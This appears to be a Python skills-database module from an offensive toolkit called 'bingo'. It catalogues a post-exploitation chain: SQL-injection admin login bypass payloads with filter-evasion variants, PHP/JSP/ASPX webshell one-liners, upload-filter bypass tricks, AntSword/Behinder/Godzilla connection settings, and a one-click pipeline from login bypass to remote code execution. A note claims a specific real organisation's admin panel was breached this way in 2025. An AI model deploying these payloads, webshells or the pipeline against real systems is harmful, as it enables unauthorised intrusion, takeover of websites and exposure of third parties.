"""
skills_data6.py — Post-Exploitation Skills
bingo v2.2.5

실전 경험 기반:
  - SQL 인젝션 관리자 로그인 우회 (comment-based: '-- -)
  - 파일 업로드 → 웹쉘 배포 (PHP/JSP/ASPX)
  - AntSword / Behinder / Godzilla 연결 설정
"""

SKILLS_DB_6: dict = {

    # ─────────────────────────────────────────────────────────
    # SQLi Admin Login Bypass
    # ─────────────────────────────────────────────────────────
    "sqli-admin-bypass": {
        "name": "SQL 인젝션 관리자 로그인 우회",
        "module": "PostExploit",
        "tags": [
            "sqli", "login-bypass", "auth-bypass", "admin",
            "comment-injection", "hash-bypass", "codeigniter",
            "관리자우회", "로그인우회", "sql",
        ],
        "desc": (
            "로그인 폼의 user_id/user_pw 파라미터에 SQL 코멘트 인젝션으로 비밀번호 검증 우회.\n"
            "주요 페이로드: admin'-- - | admin'# | ' OR '1'='1'-- -\n"
            "성공 시 관리자 대시보드 리다이렉트 URL + 세션 쿠키 반환.\n"
            "CodeIgniter / Laravel / 자체 PHP 기반 CMS에서 유효.\n\n"
            "EN: Bypass admin login via SQL comment injection in user_id field.\n"
            "Payloads: admin'-- - | admin'# | ' OR '1'='1'-- -\n"
            "Returns redirect URL + session cookie on success.\n"
            "Effective against CodeIgniter, Laravel, custom PHP CMS backends.\n\n"
            "ZH: 通过SQL注释注入绕过管理员登录验证。\n"
            "载荷：admin'-- - | admin'# | ' OR '1'='1'-- -\n"
            "成功后返回重定向URL和会话Cookie。适用于CodeIgniter/Laravel/自定义PHP CMS。"
        ),
        "tools": [
            "post_exploit.sqli_login_bypass",
            "post_exploit.SQLI_LOGIN_PAYLOADS",
        ],
        "commands": [
            "from bingo.tools.post_exploit import sqli_login_bypass",
            "",
            "result = sqli_login_bypass(",
            '    login_url = "https://target.com/adm/auth/login/check",',
            '    id_field  = "user_id",',
            '    pw_field  = "user_pw",',
            ")",
            "if result['success']:",
            "    print(f'✅ 로그인 성공!')",
            "    print(f'   페이로드  : {result[\"payload\"]}')",
            "    print(f'   리다이렉트: {result[\"redirect_url\"]}')",
            "    print(f'   쿠키      : {result[\"cookie\"]}')",
        ],
        "payloads": [
            "admin'-- -",
            "admin'#",
            "' OR '1'='1'-- -",
            "admin' OR '1'='1'-- -",
            "admin' OR 1=1-- -",
            "admin'/**/OR/**/'1'='1'#",
            "infoeyeplus'-- -",
            "administrator'-- -",
            "root'-- -",
        ],
        "notes": (
            "실전 확인 사례 (2025):\n"
            "  - https://www.ksct.or.kr/admin → POST /adm/auth/login/check\n"
            "  - user_id='admin'-- - → /adm/member/user 리다이렉트 성공\n"
            "  - 내부 쿼리 추정: SELECT * FROM tbl_admin WHERE user_id='admin'-- -' AND user_pw=MD5(?)\n"
            "탐지 우회: --+, #, /*comment*/, %23, %2D%2D+\n"
            "프레임워크별 차이: MySQL→#/-- -, MSSQL→--, Oracle→--"
        ),
    },

    # ─────────────────────────────────────────────────────────
    # File Upload → Webshell
    # ─────────────────────────────────────────────────────────
    "webshell-upload": {
        "name": "파일 업로드 → 웹쉘 배포",
        "module": "PostExploit",
        "tags": [
            "webshell", "file-upload", "rce", "post-exploit",
            "antsword", "behinder", "godzilla",
            "php", "jsp", "aspx", "upload-bypass",
            "웹쉘", "파일업로드", "원격코드실행",
        ],
        "desc": (
            "파일 업로드 기능을 이용해 웹쉘 배포 후 AntSword/Behinder/Godzilla로 접속.\n"
            "업로드 우회: 확장자 변형(.phtml/.php5), Content-Type 변조(image/jpeg), 매직바이트 삽입.\n"
            "지원 언어: PHP, JSP, ASPX / 지원 도구: AntSword, Behinder, Godzilla.\n\n"
            "EN: Deploy webshell via file upload vulnerability, connect via AntSword/Behinder/Godzilla.\n"
            "Bypass: extension variant (.phtml/.php5), Content-Type spoofing (image/jpeg),\n"
            "magic byte prepend (GIF89a / \\xff\\xd8\\xff).\n"
            "Supported: PHP, JSP, ASPX / Tools: AntSword, Behinder, Godzilla.\n\n"
            "ZH: 通过文件上传漏洞部署Webshell，支持AntSword/冰蝎/哥斯拉连接。\n"
            "绕过方法：扩展名变形(.phtml/.php5)、Content-Type伪造(image/jpeg)、魔术字节注入。\n"
            "支持语言：PHP、JSP、ASPX；支持工具：AntSword、冰蝎、哥斯拉。"
        ),
        "tools": [
            "post_exploit.get_webshell",
            "post_exploit.upload_webshell",
            "post_exploit.verify_webshell",
            "post_exploit.build_upload_payload",
            "post_exploit.UPLOAD_BYPASS_EXTENSIONS",
            "post_exploit.WEBSHELL_PAYLOADS",
        ],
        "commands": [
            "from bingo.tools.post_exploit import (",
            "    get_webshell, upload_webshell, verify_webshell",
            ")",
            "",
            "# 1. 웹쉘 선택 (php + antsword)",
            'shell = get_webshell("php", "antsword")',
            "print(shell['code'])  # <?php @eval($_POST[\"ant\"]);?>",
            "",
            "# 2. 업로드 (로그인 세션 opener 필요)",
            "result = upload_webshell(",
            "    opener     = opener,  # sqli_login_bypass 결과",
            '    upload_url = "https://target.com/adm/upload",',
            "    shell_payload = shell,",
            '    bypass_ext = ".phtml",',
            '    bypass_ct  = "image/jpeg",',
            ")",
            "",
            "# 3. 실행 검증",
            "if result['uploaded_url']:",
            "    v = verify_webshell(opener, result['uploaded_url'], 'ant')",
            "    print('✅ 웹쉘 동작!' if v['alive'] else '✗ 응답 없음')",
        ],
        "payloads": [
            # PHP
            '<?php @eval($_POST["ant"]);?>',
            '<?php @eval(base64_decode($_POST["ant"]));?>',
            '<?php system($_GET["cmd"]);?>',
            # JSP
            '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
            # ASPX
            '<%@ Page Language="Jscript"%><%eval(Request.Item["ant"],"unsafe");%>',
            # 우회용 확장자
            ".phtml", ".php5", ".php3", ".pHp", ".php::$DATA",
        ],
        "notes": (
            "AntSword 연결 설정:\n"
            "  URL      : https://target.com/uploads/shell.php\n"
            "  Password : ant  (POST 파라미터명)\n"
            "  Type     : PHP\n"
            "  Encoding : default\n\n"
            "Behinder v3 기본 비밀번호: rebeyond (AES-128)\n"
            "Godzilla 기본 비밀번호: pass (MD5 키)\n\n"
            "업로드 우회 우선순위:\n"
            "  1. .phtml / .php5 (서버 설정 미비)\n"
            "  2. Content-Type: image/jpeg + GIF89a 매직바이트\n"
            "  3. 이중 확장자: shell.php.jpg → .htaccess 설정 우회\n"
            "  4. null byte: shell.php%00.jpg (구버전 PHP)\n"
            "  5. Windows: shell.php::$DATA (NTFS ADS)\n"
            "upload_url 탐색: /upload, /uploads, /files, /images, /media"
        ),
    },

    # ─────────────────────────────────────────────────────────
    # AntSword Config Generator
    # ─────────────────────────────────────────────────────────
    "antsword-config": {
        "name": "AntSword 연결 설정 자동 생성",
        "module": "PostExploit",
        "tags": [
            "antsword", "webshell-connect", "rat", "post-exploit",
            "json-config", "behinder", "godzilla",
            "개미검", "웹쉘연결",
        ],
        "desc": (
            "업로드된 웹쉘 URL + 비밀번호로 AntSword 임포트 JSON 자동 생성.\n"
            "AntSword Data Manager → Import 기능으로 즉시 연결 가능.\n"
            "Behinder(빙허), Godzilla(고질라) 연결 파라미터도 포함.\n\n"
            "EN: Auto-generate AntSword import JSON from shell URL + password.\n"
            "Import via AntSword Data Manager → Import for instant connection.\n"
            "Also includes Behinder and Godzilla connection parameters.\n\n"
            "ZH: 根据Webshell URL和密码自动生成AntSword导入JSON。\n"
            "通过AntSword数据管理器→导入功能即可连接。同时包含冰蝎和哥斯拉的连接参数。"
        ),
        "tools": [
            "post_exploit.generate_antsword_config",
            "post_exploit.print_antsword_guide",
        ],
        "commands": [
            "from bingo.tools.post_exploit import generate_antsword_config, print_antsword_guide",
            "import json",
            "",
            "cfg = generate_antsword_config(",
            '    shell_url  = "https://target.com/uploads/shell.php",',
            '    password   = "ant",',
            '    shell_type = "PHP",',
            ")",
            "",
            "# JSON 파일로 저장",
            "with open('antsword_config.json', 'w') as f:",
            "    json.dump(cfg, f, indent=2)",
            "print('✅ antsword_config.json 생성 완료')",
            "",
            "# 연결 가이드 출력",
            'print(print_antsword_guide("https://target.com/uploads/shell.php", "ant"))',
        ],
        "payloads": [],
        "notes": (
            "AntSword 수동 연결:\n"
            "  1. AntSword 실행 → 빈 공간 우클릭 → Add Data\n"
            "  2. URL: https://target.com/uploads/shell.php\n"
            "  3. Password: ant\n"
            "  4. Request Type: POST\n"
            "  5. Encode: default\n"
            "  6. Shell Type: PHP\n"
            "  7. Test Connection → 초록불 확인\n\n"
            "Behinder 연결:\n"
            "  URL + 비밀번호(rebeyond) 입력 후 AES-128 CBC 모드 선택\n\n"
            "Godzilla 연결:\n"
            "  PHP::PhpDynamicPayload 선택 + 비밀번호(pass) + 키(key) 입력"
        ),
    },

    # ─────────────────────────────────────────────────────────
    # Full Post-Exploit Pipeline
    # ─────────────────────────────────────────────────────────
    "post-exploit-pipeline": {
        "name": "후속 침투 전체 자동화 파이프라인",
        "module": "PostExploit",
        "tags": [
            "post-exploit", "pipeline", "automation", "full-chain",
            "sqli", "webshell", "antsword", "rce",
            "자동화", "풀체인", "후속침투",
        ],
        "desc": (
            "SQLi 로그인 우회 → 웹쉘 업로드 → 실행 검증 → AntSword 설정 생성까지 전체 자동화.\n"
            "관리자 패널 접근 후 파일 업로드 기능이 있는 경우 원클릭 RCE까지 진행.\n\n"
            "EN: Full automation pipeline: SQLi login bypass → webshell upload → "
            "execution verify → AntSword config generation.\n"
            "One-click RCE after gaining admin panel access with file upload functionality.\n\n"
            "ZH: 全自动化流程：SQL注入登录绕过→Webshell上传→执行验证→AntSword配置生成。\n"
            "获得管理员面板后，若存在文件上传功能，可一键实现RCE。"
        ),
        "tools": [
            "post_exploit.auto_post_exploit",
        ],
        "commands": [
            "from bingo.tools.post_exploit import auto_post_exploit",
            "import json",
            "",
            "result = auto_post_exploit(",
            '    base_url    = "https://target.com",',
            '    login_url   = "https://target.com/adm/auth/login/check",',
            '    upload_url  = "https://target.com/adm/upload",',
            '    id_field    = "user_id",',
            '    pw_field    = "user_pw",',
            '    lang        = "php",',
            '    tool        = "antsword",',
            ")",
            "",
            "if result.get('success'):",
            "    print('✅ 웹쉘 실행 확인!')",
            "    print(result['antsword_guide'])",
            "    with open('antsword_config.json','w') as f:",
            "        json.dump(result['antsword'], f, indent=2)",
            "else:",
            "    print(f'현재 단계: {result.get(\"step\")}')",
            "    print(f'로그인: {result.get(\"login\", {}).get(\"success\")}')",
            "    print(f'업로드: {result.get(\"upload\", {}).get(\"success\")}')",
        ],
        "payloads": [],
        "notes": (
            "파이프라인 단계별 실패 처리:\n"
            "  1. 로그인 실패 → 추가 SQLi 페이로드 시도 or 해시 크랙\n"
            "  2. 업로드 실패 → 업로드 경로 탐색 필요 (/upload, /api/upload, /adm/upload)\n"
            "  3. 업로드 경로 미탐지 → 응답 분석 후 수동 입력\n"
            "  4. 실행 실패 → 다른 확장자/페이로드 재시도\n\n"
            "실전 팁:\n"
            "  - 업로드 URL은 관리자 패널 메뉴에서 에디터/갤러리/파일 관리 기능 탐색\n"
            "  - 응답에서 업로드 경로가 반환되지 않으면 /uploads/ 디렉토리 퍼징\n"
            "  - 관리자 패널에서 직접 소스 편집(PHP 파일 수정) 기능 확인\n"
            "  - WAF 있을 경우: 청크 인코딩 / 멀티바이트 우회 시도"
        ),
    },
}

MODULE_INDEX_6: dict = {
    "PostExploit": [
        "sqli-admin-bypass",
        "webshell-upload",
        "antsword-config",
        "post-exploit-pipeline",
    ],
}

TAG_INDEX_6: dict[str, list[str]] = {}
for _sid, _sdata in SKILLS_DB_6.items():
    for _tag in _sdata.get("tags", []):
        if _tag not in TAG_INDEX_6:
            TAG_INDEX_6[_tag] = []
        TAG_INDEX_6[_tag].append(_sid)
